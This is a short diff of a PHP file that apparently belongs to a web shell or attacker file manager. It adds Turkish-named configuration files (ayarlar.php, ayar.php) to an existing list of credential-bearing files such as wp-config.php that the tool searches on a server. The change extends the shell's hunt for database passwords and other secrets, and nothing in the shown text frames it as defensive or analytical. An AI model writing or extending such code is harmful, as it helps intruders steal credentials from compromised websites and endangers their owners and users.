@@ -2116,7 +2116,7 @@ if (! checkfunctioN ( 'posix_getgrgid' )) {
 }
 function filemanageR() {
 	global $windows, $cwd, $hcwd, $Resource_Dir;
-	$cfg = array ('wp-config.php', 'config.php', 'configuration.php' );
+	$cfg = array ('wp-config.php', 'config.php', 'configuration.php', 'ayarlar.php', 'ayar.php');
 	if (! empty ( $_REQUEST ['task'] )) {
 		if (! empty ( $_REQUEST ['search'] ))
 			$_REQUEST ['task'] = 7;
